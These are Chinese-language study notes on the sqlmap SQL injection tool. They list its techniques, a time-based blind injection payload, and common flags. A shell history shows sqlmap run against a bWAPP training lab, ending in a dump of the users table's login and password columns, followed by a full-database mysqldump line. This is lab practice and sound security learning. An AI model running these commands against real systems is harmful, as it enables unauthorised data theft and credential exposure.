开源sql注入漏洞检测，利用工具  
检测动态页面中get/post参数，cookie，http  
数据榨取  
文件系统访问  
操作系统命令执行  
引擎强大，特性丰富  
Xss漏洞检测    

五种漏洞检测技术  
        基于布尔的盲注检测  
        基于时间的盲注检测  
                  'and(select * from (select(sleep(20)))a)--+  
        基于错误的检测  
        基于union联合查询的检测  
                  适用于通过循环直接输出联合查询结果，否则只显示第一项结果  
        基于堆叠查询的检测  
                  ；堆叠多个查询语句  
                  适用于非select的数据修改，删除的操作  
支持的数据库管理系统DBMS  
        mysql,oracle,postgresql,microsoft sql server,Microsoft Access, IBM DB2, SQLite,Firebird, Sybase , SAP MaxDB  



其他特性  
        数据库直接连接-D  
                  不通过sql注入，指定身份认证信息，IP，端口  
        与burpsuite，google结合使用，支持正则表达式限定测试目标  
        get，post，cookie，referer，user-agent（随机或者指定）  
                  cookie过期后自动处理set-cookie头信息，更新cookie信息  
        限速：最大并发，延迟发送  
        支持basic，digest，ntlm，ca身份认证  
        数据库版本，用户，权限，hash枚举和字典破解，暴力破解表列名称  
        文件上传下载，UDF，启动并执行存储过程，操作系统命令执行，访问windows注册表  
        与w3af，metasploit集成结合使用，基于数据库服务进程提权和上传执行后门  
        
sqlmap参数
        sqlmap -u URL  
        sqlmap -f 检查指纹信息（足迹）  
        sqlmap -u url -p(选择你要检查的变量）username -f  
        sqlmap --users #查询数据库帐号  
        sqlmap --banner #查询当前系统信息  
        sqlmap --dbs #查询当前数据库有那些库存在  
        sqlmap --schema #查看源数据库（源）  
        sqlmap -a #显示所有信息  

```shell
  381  sqlmap -u http://10.0.0.8/bWAPP/sqli_17.php --cookie="security_level=0; PHPSESSID=d0c96f6bcc199ac381b801471373963b"  --level 5 --random-agent -f -b --dbs --users
  382  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs=mysql --level5 -t -b --database
  383  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs:mysql --level5 -t -b --database
  384  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs --level5 -t -b --database
  385  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs --level 5 -t -b --database
  386  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --dbs --database
  387  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --dbs 
  388  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --current-db
  389  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --current-table
  390  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --current-db
  391  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --tables
  392  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --tables -D bWAPP
  393  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b -D bWAPP -T users --columns
  394  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b -D bWAPP -T users --dump -C "login,Password"
  
  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=0fb89681a682f570a2ad6d7834f0ba9d; security_level=0"  --level 5 -t -b -D bWAPP -T users --dump -C "login,Password" --is-dba
```

`mysqldump -A -R -E --triggers --master-data=2 --single-transaction > /tmp/full.sql` 脱库